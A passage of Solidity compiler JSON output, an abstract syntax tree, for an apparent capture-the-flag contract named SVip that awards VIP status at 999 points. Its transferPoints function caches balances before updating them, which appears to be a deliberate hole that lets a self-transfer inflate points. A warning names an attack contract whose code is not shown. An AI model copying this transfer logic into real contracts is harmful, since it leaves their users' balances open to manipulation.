					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"formattedMessage": "赛题-预赛/第二题/SvipAttack.sol:5:5: Warning: No visibility specified. Defaulting to \"public\". \n    constructor(address _addr){\r\n    ^ (Relevant source part starts here and spans across multiple lines).\n",
				"message": "No visibility specified. Defaulting to \"public\". ",
				"severity": "warning",
				"sourceLocation": {
					"end": 149,
					"file": "赛题-预赛/第二题/SvipAttack.sol",
					"start": 88
				},
				"type": "Warning"
			}
		],
		"sources": {
			"赛题-预赛/第二题/SVip.sol": {
				"ast": {
					"absolutePath": "赛题-预赛/第二题/SVip.sol",
					"exportedSymbols": {
						"SVip": [
							120
						]
					},
					"id": 121,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.4",
								".24"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 120,
							"linearizedBaseContracts": [
								120
							],
							"name": "SVip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 5,
									"name": "points",
									"nodeType": "VariableDeclaration",
									"scope": 120,
									"src": "49:38:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 4,
										"keyType": {
											"id": 2,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "57:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "49:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 3,
											"name": "uint",
											"nodeType": "ElementaryTypeName",
											"src": "68:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 9,
									"name": "isSuperVip",
									"nodeType": "VariableDeclaration",
									"scope": 120,
									"src": "94:42:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
										"typeString": "mapping(address => bool)"
									},
									"typeName": {
										"id": 8,
										"keyType": {
											"id": 6,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "102:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "94:24:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
											"typeString": "mapping(address => bool)"
										},
										"valueType": {
											"id": 7,
											"name": "bool",
											"nodeType": "ElementaryTypeName",
											"src": "113:4:0",
											"typeDescriptions": {
												"typeIdentifier": "t_bool",
												"typeString": "bool"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 11,
									"name": "numOfFree",
									"nodeType": "VariableDeclaration",
									"scope": 120,
									"src": "143:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "143:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 31,
										"nodeType": "Block",
										"src": "208:132:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 20,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 15,
																	"name": "points",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 5,
																	"src": "227:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 18,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 16,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 207,
																		"src": "234:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 17,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "234:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "227:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "393939",
																"id": 19,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "249:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_999_by_1",
																	"typeString": "int_const 999"
																},
																"value": "999"
															},
															"src": "227:25:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536f7272792c20796f7520646f6e2774206861766520656e6f75676820706f696e7473",
															"id": 21,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "254:37:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f5b0dfe90ad922af5e53d38c2e82e535e2b2168be0b54a55859c689450d597a8",
																"typeString": "literal_string \"Sorry, you don't have enough points\""
															},
															"value": "Sorry, you don't have enough points"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f5b0dfe90ad922af5e53d38c2e82e535e2b2168be0b54a55859c689450d597a8",
																"typeString": "literal_string \"Sorry, you don't have enough points\""
															}
														],
														"id": 14,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															210,
															211
														],
														"referencedDeclaration": 211,
														"src": "219:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "219:73:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 23,
												"nodeType": "ExpressionStatement",
												"src": "219:73:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 29,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 24,
															"name": "isSuperVip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "303:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																"typeString": "mapping(address => bool)"
															}
														},
														"id": 27,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 25,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 207,
																"src": "314:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 26,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "314:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "303:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "74727565",
														"id": 28,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "328:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"src": "303:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 30,
												"nodeType": "ExpressionStatement",
												"src": "303:29:0"
											}
										]
									},
									"documentation": null,
									"id": 32,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "promotionSVip",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "198:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "208:0:0"
									},
									"scope": 120,
									"src": "176:164:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 51,
										"nodeType": "Block",
										"src": "374:99:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 38,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 36,
																"name": "numOfFree",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 11,
																"src": "393:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 37,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "405:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "393:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 35,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															210,
															211
														],
														"referencedDeclaration": 210,
														"src": "385:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 39,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "385:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 40,
												"nodeType": "ExpressionStatement",
												"src": "385:24:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 46,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 41,
															"name": "points",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "420:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 44,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 42,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 207,
																"src": "427:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 43,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "427:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "420:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 45,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "442:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "420:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 47,
												"nodeType": "ExpressionStatement",
												"src": "420:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 49,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "UnaryOperation",
													"operator": "++",
													"prefix": false,
													"src": "454:11:0",
													"subExpression": {
														"argumentTypes": null,
														"id": 48,
														"name": "numOfFree",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "454:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 50,
												"nodeType": "ExpressionStatement",
												"src": "454:11:0"
											}
										]
									},
									"documentation": null,
									"id": 52,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "getPoint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 33,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "365:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "374:0:0"
									},
									"scope": 120,
									"src": "348:125:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 103,
										"nodeType": "Block",
										"src": "544:269:0",
										"statements": [
											{
												"assignments": [
													60
												],
												"declarations": [
													{
														"constant": false,
														"id": 60,
														"name": "tempSender",
														"nodeType": "VariableDeclaration",
														"scope": 104,
														"src": "555:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 59,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "555:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 65,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 61,
														"name": "points",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "576:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 64,
													"indexExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 62,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 207,
															"src": "583:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 63,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "583:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "576:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "555:39:0"
											},
											{
												"assignments": [
													67
												],
												"declarations": [
													{
														"constant": false,
														"id": 67,
														"name": "tempTo",
														"nodeType": "VariableDeclaration",
														"scope": 104,
														"src": "605:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 66,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "605:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 71,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 68,
														"name": "points",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "622:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 70,
													"indexExpression": {
														"argumentTypes": null,
														"id": 69,
														"name": "to",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "629:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "622:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "605:27:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 75,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 73,
																"name": "tempSender",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 60,
																"src": "651:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"id": 74,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 56,
																"src": "664:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "651:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 72,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															210,
															211
														],
														"referencedDeclaration": 210,
														"src": "643:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 76,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "643:28:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 77,
												"nodeType": "ExpressionStatement",
												"src": "643:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 79,
																	"name": "tempTo",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 67,
																	"src": "690:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "+",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 80,
																	"name": "amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 56,
																	"src": "699:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "690:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"id": 82,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 56,
																"src": "708:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "690:24:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 78,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															210,
															211
														],
														"referencedDeclaration": 210,
														"src": "682:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "682:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 85,
												"nodeType": "ExpressionStatement",
												"src": "682:33:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 93,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 86,
															"name": "points",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "726:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 89,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 87,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 207,
																"src": "733:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 88,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "733:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "726:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 92,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 90,
															"name": "tempSender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 60,
															"src": "747:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"id": 91,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 56,
															"src": "760:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "747:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "726:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 94,
												"nodeType": "ExpressionStatement",
												"src": "726:40:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 101,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 95,
															"name": "points",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 5,
															"src": "777:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 97,
														"indexExpression": {
															"argumentTypes": null,
															"id": 96,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 54,
															"src": "784:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "777:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 100,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 98,
															"name": "tempTo",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 67,
															"src": "790:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "+",
														"rightExpression": {
															"argumentTypes": null,
															"id": 99,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 56,
															"src": "799:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "790:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "777:28:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 102,
												"nodeType": "ExpressionStatement",
												"src": "777:28:0"
											}
										]
									},
									"documentation": null,
									"id": 104,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "transferPoints",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 54,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 104,
												"src": "509:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 53,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "509:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 104,
												"src": "521:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "521:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "508:28:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 58,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "544:0:0"
									},
									"scope": 120,
									"src": "485:328:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 118,
										"nodeType": "Block",
										"src": "870:72:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 110,
																"name": "isSuperVip",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
